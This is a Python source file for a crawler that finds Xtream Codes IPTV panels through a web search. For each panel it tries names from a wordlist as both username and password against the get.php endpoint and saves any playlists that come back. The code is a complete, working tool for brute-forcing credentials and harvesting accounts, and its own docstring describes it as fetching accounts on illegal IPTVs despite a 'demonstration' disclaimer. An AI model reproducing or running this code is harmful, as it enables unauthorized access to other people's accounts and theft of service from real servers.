import os
import random
import time
from urllib.parse import urlparse
import requests
from googlesearch import search
import pyprind

"""Crawler
Class that handles the crawling process that fetch accounts on illegal IPTVs

Authors:
Claudio Ludovico (@Ludo237)
Pinperepette (@Pinperepette)
Arm4x (@Arm4x)
"""
class Crawler(object):
    # version
    version = "1.2.3"
    # output default directory
    outputDir = "output"
    # language default directory
    languageDir = "languages"
    # string used to exploit the CMS
    basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
    # string used to search the CMS
    searchString = "Xtream Codes v1.0.59.5"

    def __init__(self, language="it"):
        """Default constructor

        Keyword arguments:
        language -- Language parameter allows us to understand what kind of
                    names file we need to use. (default it)
        """
        self.language = language.lower()
        self.parsedUrls = []
        self.foundedAccounts = 0

    def change_language(self, language="it"):
        """Set the language you want to use to brute force names

        Keyword arguments:
        language -- Language parameter allows us to understand what kind of
                    names file we need to use. (default it)

        Return:
        boolean -- true if the language file exists, otherwise false
        """
        if os.path.isfile(os.path.join(self.languageDir, language + ".txt")):
            self.language = language
            return True
        else:
            return False

    def search_links(self):
        """Print the first 30 links from a Web search

        We set the limit of 30 links because this script serve as demonstration and it's
        not intended to be use for personal purpose.
        """
        try:
            for url in search(self.searchString, num_results=30):
                parsed = urlparse(url)
                self.parsedUrls.append(parsed.scheme + "://" + parsed.netloc)
                if len(self.parsedUrls) >= 30:
                    break
        except Exception as e:
            print(f"Error fetching links: {e}")

    def search_accounts(self, url=None):
        """Search Accounts
        This is the core method. It will crawl the given url for any possible accounts.
        """
        if not self.parsedUrls:
            return "You must fetch some URLs first"
        try:
            if not url:
                url = random.choice(self.parsedUrls)
            fileName = os.path.join(self.languageDir, self.language + ".txt")
            fileLength = self.file_length(fileName)
            progressBar = pyprind.ProgBar(fileLength, title="Fetching account from " + url + " this might take a while.", stream=1, monitor=True)
            self.foundedAccounts = 0
            with open(fileName, "r", encoding="utf-8", errors="ignore") as f:
                rows = f.readlines()
            
            headers = {'User-Agent': 'Mozilla/5.0'}
            for row in rows:
                username = row.strip()
                if not username:
                    continue
                target_url = url + self.basicString % (username, username)
                try:
                    res = requests.get(target_url, headers=headers, timeout=5)
                    fetched = res.text
                    if len(fetched) > 0 and "#EXTM3U" in fetched:
                        newPath = os.path.join(self.outputDir, url.replace("http://", "").replace("https://", ""))
                        self.create_file(username, newPath, fetched)
                except requests.RequestException:
                    pass
                
                progressBar.update()

            self.parsedUrls.remove(url)
            if self.foundedAccounts != 0:
                return "Search done, account founded on " + url + ": " + str(self.foundedAccounts)
            else:
                return "No results for " + url
        except IOError:
            return "Cannot open the current Language file. Try another one"
        except Exception as e:
            return f"Ops something went wrong: {e}"

    def create_file(self, row, newPath, fetched):
        """Create File"""
        if not os.path.exists(newPath):
            os.makedirs(newPath)
        filePath = os.path.join(newPath, f"tv_channels_{row.strip()}.m3u")
        with open(filePath, "w", encoding="utf-8") as outputFile:
            outputFile.write(fetched)
        self.foundedAccounts += 1

    def file_length(self, fileName):
        """File Length"""
        i = 0
        with open(fileName, "r", encoding="utf-8", errors="ignore") as f:
            for i, _ in enumerate(f, start=1):
                pass
        return i
